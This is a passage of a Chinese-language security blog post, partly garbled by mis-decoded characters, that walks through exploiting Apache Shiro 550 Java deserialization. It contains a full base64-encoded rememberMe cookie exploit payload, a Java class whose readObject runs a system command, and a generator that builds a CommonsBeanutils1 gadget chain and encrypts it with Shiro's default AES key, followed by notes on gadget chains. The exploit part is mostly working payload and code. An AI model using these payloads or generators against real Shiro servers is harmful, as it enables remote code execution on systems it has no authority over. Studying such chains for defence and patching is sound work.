<br>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<br></code></pre></td></tr></table></figure><p>å‘é€ cookie è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Cookie: <br>rememberMe=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<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147642.png" alt="null"></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨å·¥å…·ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147425.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147524.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101151464.png" alt="null"></p><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p><strong>é‡å†™readObject</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Serializable æ¥å£è¡¨ç¤ºè¿™ä¸ªç±»æ”¯æŒ Java åºåˆ—åŒ–</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;qaz&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gender=<span class="hljs-string">&quot;man&quot;</span>; <br><br>    <span class="hljs-comment">//æ„é€ æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name,String gender)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">//é‡å†™ readObject ï¼Œå½“ä½¿ç”¨ ObjectInputStream.readObject() ååºåˆ—åŒ–æ—¶ï¼ŒJVM ä¼šè‡ªåŠ¨æ£€æŸ¥ç±»é‡Œæ˜¯å¦æœ‰ private void readObject(ObjectInputStream) æ–¹æ³•ï¼Œå¦‚æœæœ‰ï¼Œå°±ä¼šåœ¨æ¢å¤å¯¹è±¡åè°ƒç”¨å®ƒ</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//è¡¨ç¤ºæŒ‰ç…§é»˜è®¤æ–¹å¼ååºåˆ—åŒ–å¯¹è±¡çš„å­—æ®µ</span><br>        ois.defaultReadObject();<br>        <span class="hljs-comment">//ååºåˆ—åŒ–æ—¶ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Shiroä½¿ç”¨çš„æ˜¯JavaåŸç”Ÿååºåˆ—åŒ–ï¼ˆå½“ä¸€ä¸ªç±»å®ç°äº†Serializableæ¥å£å¹¶ä¸”é‡å†™readObjectæ–¹æ³•æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šåœ¨å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ—¶è¢«è°ƒç”¨ï¼‰ï¼Œå…¶æ¼æ´æˆå› æ˜¯ååºåˆ—åŒ–çš„ç±»<strong>é‡å†™äº†readObjectæ–¹æ³•</strong>ï¼Œååºåˆ—åŒ–æ—¶è°ƒç”¨readObject() è§¦å‘é‡å†™ç±»çš„readObject() æ–¹æ³•</p><p>åˆ©ç”¨ï¼šæ¶æ„å‘½ä»¤ -&gt; åºåˆ—åŒ– -&gt; AESåŠ å¯† -&gt;  Base64ç¼–ç  -&gt; rememberMe Cookie å€¼ -&gt; Base64è§£ç  -&gt; AESè§£å¯† -&gt; ååºåˆ—åŒ– -&gt; æ‰§è¡Œæ¶æ„å‘½ä»¤</p><h2 id="Shiro-550ååºåˆ—åŒ–"><a href="#Shiro-550ååºåˆ—åŒ–" class="headerlink" title="Shiro 550ååºåˆ—åŒ–"></a>Shiro 550ååºåˆ—åŒ–</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="å‚è€ƒæ–‡ç« ï¼š-1"><a href="#å‚è€ƒæ–‡ç« ï¼š-1" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h4><p>å…³äºæˆ‘å­¦æ¸—é€çš„é‚£æ¡£å­äº‹ä¹‹Javaååºåˆ—åŒ–-CBé“¾</p><p><a href="https://www.freebuf.com/articles/web/319397.html">https://www.freebuf.com/articles/web/319397.html</a></p><p>Javaä»£ç å®¡è®¡&amp;Shiroååºåˆ—åŒ–&amp;CB1é“¾</p><p><a href="https://blog.csdn.net/qq_46081990/article/details/135724944">https://blog.csdn.net/qq_46081990/article/details/135724944</a></p><p>CCé“¾ 1-7 åˆ†æ</p><p><a href="https://xz.aliyun.com/news/8908">https://xz.aliyun.com/news/8908</a></p><p>Javawebå®‰å…¨â€”â€”ååºåˆ—åŒ–æ¼æ´-CC&amp;CBé“¾æ€è·¯æ•´ç†</p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121">https://blog.csdn.net/weixin_43610673/article/details/127580121</a></p><h4 id="1ã€CC-CB-é“¾-ï¼ˆç®€å•ç†è§£ï¼‰"><a href="#1ã€CC-CB-é“¾-ï¼ˆç®€å•ç†è§£ï¼‰" class="headerlink" title="1ã€CC &amp; CB é“¾ ï¼ˆç®€å•ç†è§£ï¼‰"></a>1ã€CC &amp; CB é“¾ ï¼ˆç®€å•ç†è§£ï¼‰</h4><p><strong>shiroååºåˆ—åŒ–åˆ©ç”¨å·¥å…·</strong></p><p>JavaThings - Javaå®‰å…¨æ¼«è°ˆç¬”è®°ç›¸å…³</p><p><a href="https://github.com/phith0n/JavaThings/tree/master">https://github.com/phith0n/JavaThings/tree/master</a></p><p><strong>Commons Collections é“¾</strong></p><p>æ¥æº Apache Commons Collections åº“ï¼Œåˆ©ç”¨è¯¥åº“çš„ <code>Transformer</code>ã€<code>LazyMap</code> ç­‰ç±»ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨æ¶æ„ä»£ç </p><p><strong>Commons Beanutils é“¾</strong></p><p>æ¥æºï¼šApache Commons Beanutils åº“ï¼Œåˆ©ç”¨ <code>BeanComparator</code> åœ¨ååºåˆ—åŒ–è§¦å‘æ’åºæ¯”è¾ƒæ—¶ï¼Œè°ƒç”¨ getter æ–¹æ³•ï¼Œä»è€Œé—´æ¥è§¦å‘å¦ä¸€æ¡æ¼æ´é“¾ï¼ˆå¸¸å¸¸æ˜¯ cc é“¾ï¼‰</p><p>CB é“¾ç”Ÿæˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-comment">//è·å– Evil ç±»ï¼Œæ‰§è¡Œ Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.get(com.govuln.shiroattack.Evil.class.getName());<br>        <span class="hljs-comment">//è°ƒç”¨ CommonsBeanutils1Shiro#getPayloadï¼Œä¼ å…¥åºåˆ—åŒ–çš„æ¶æ„ç±»ï¼Œç”Ÿæˆ CB1 é“¾ååºåˆ—åŒ–çš„ payload</span><br>        <span class="hljs-type">byte</span>[] payloads = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsBeanutils1Shiro</span>().getPayload(clazz.toBytecode());<br><br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-comment">//å°† key å€¼Base64 ç¼–ç </span><br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AES åŠ å¯† payloadï¼Œ</span><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2ã€ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»é“¾é€šå¸¸ç”±ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š"><a href="#2ã€ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»é“¾é€šå¸¸ç”±ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š" class="headerlink" title="2ã€ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»é“¾é€šå¸¸ç”±ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š"></a>2ã€ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»é“¾é€šå¸¸ç”±ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š</h4><p>1ã€Sourceï¼ˆæºï¼‰ï¼šå…¥å£ç‚¹ï¼Œé€šå¸¸æ˜¯æŒ‡æ”»å‡»é“¾çš„èµ·å§‹ç‚¹ï¼Œå…¶ä¸­ç”¨æˆ·è¾“å…¥æˆ–å¤–éƒ¨æ•°æ®è¿›å…¥åº”ç”¨ç¨‹åºã€‚åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­ï¼ŒreadObject æ–¹æ³•é€šå¸¸è¢«è®¤ä¸ºæ˜¯æºï¼Œå› ä¸ºå®ƒæ˜¯ä»è¾“å…¥æµè¯»å–æ•°æ®å¹¶è¿›è¡Œååºåˆ—åŒ–çš„æ–¹æ³•ã€‚</p><p>2ã€Sinkï¼ˆæ‰§è¡Œç‚¹ï¼‰ï¼šæ‰§è¡Œç‚¹ï¼Œæ˜¯æ”»å‡»é“¾ä¸Šçš„ç»ˆç‚¹ï¼Œå…¶ä¸­æ”»å‡»è€…å¸Œæœ›æ‰§è¡Œæ¶æ„æ“ä½œçš„ä½ç½®ã€‚åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œsink å¯èƒ½æ˜¯ä¸€ä¸ªåŠ¨æ€æ–¹æ³•æ‰§è¡Œã€JNDIæ³¨å…¥æˆ–å†™æ–‡ä»¶ç­‰æ“ä½œã€‚</p><p>3ã€Gadgetï¼ˆé“¾ï¼‰ï¼šè¿æ¥å…¥å£æ‰§è¡Œçš„å¤šä¸ªç±»ï¼Œé€šè¿‡å®ƒä»¬çš„ç›¸äº’æ–¹æ³•è°ƒç”¨å½¢æˆæ”»å‡»é“¾ã€‚Gadget ç±»é€šå¸¸æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼Œä¾‹å¦‚ç±»ä¹‹é—´æ–¹æ³•è°ƒç”¨</p><p>æ˜¯é“¾å¼çš„ï¼Œç±»å®ä¾‹ä¹‹é—´çš„å…³ç³»æ˜¯åµŒå¥—çš„ï¼Œè°ƒç”¨é“¾ä¸Šçš„ç±»éƒ½éœ€è¦æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­ï¼ŒGadget ç±»æ˜¯æ”»å‡»è€…æ„å»ºçš„ã€å¯åºåˆ—</p><p>åŒ–çš„ç±»ï¼Œé€šè¿‡æ„å»ºç‰¹å®šçš„å¯¹è±¡å›¾ï¼Œä½¿å¾—åœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><h4 id="3ã€ç†è§£æ•°æ®ç»“æ„"><a href="#3ã€ç†è§£æ•°æ®ç»“æ„" class="headerlink" title="3ã€ç†è§£æ•°æ®ç»“æ„"></a>3ã€ç†è§£æ•°æ®ç»“æ„</h4><p>æ•°æ®ç»“æ„ï¼š</p><p><a href="https://oi-wiki.org/ds/">https://oi-wiki.org/ds/</a></p><p>äºŒå‰å †</p><p><a href="https://oi-wiki.org/ds/binary-heap/">https://oi-wiki.org/ds/binary-heap/</a></p><p>å †åˆ†ä¸ºå¤§æ ¹å †ï¼ˆçˆ¶èŠ‚ç‚¹å€¼ä¸å°äºå­èŠ‚ç‚¹å€¼ï¼‰å’Œå°æ ¹å †ï¼ˆçˆ¶èŠ‚ç‚¹å€¼ä¸å¤§äºå­èŠ‚ç‚¹å€¼ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110935553.png" alt="null"></p><h4 id="4ã€CBä¸­çš„JavaBeanåˆ©ç”¨"><a href="#4ã€CBä¸­çš„JavaBeanåˆ©ç”¨" class="headerlink" title="4ã€CBä¸­çš„JavaBeanåˆ©ç”¨"></a>4ã€CBä¸­çš„JavaBeanåˆ©ç”¨</h4><p>PropertyUtils.getProperty(new Person(),â€nameâ€);</p><p>è‡ªåŠ¨è°ƒç”¨Personå¯¹è±¡é‡Œé¢çš„getNameæ–¹æ³•</p><p>PropertyUtils.getProperty(new TemplatesImpl(),â€outputPropertiesâ€)</p><p>è‡ªåŠ¨è°ƒç”¨TemplatesImplå¯¹è±¡é‡Œé¢çš„getOutputPropertiesæ–¹æ³•</p><h3 id="Shiro-550-CB1-é“¾åˆ†æ"><a href="#Shiro-550-CB1-é“¾åˆ†æ" class="headerlink" title="Shiro 550 CB1 é“¾åˆ†æ"></a>Shiro 550 CB1 é“¾åˆ†æ</h3><h4 id="åˆ©ç”¨é“¾æµç¨‹ï¼š"><a href="#åˆ©ç”¨é“¾æµç¨‹ï¼š" class="headerlink" 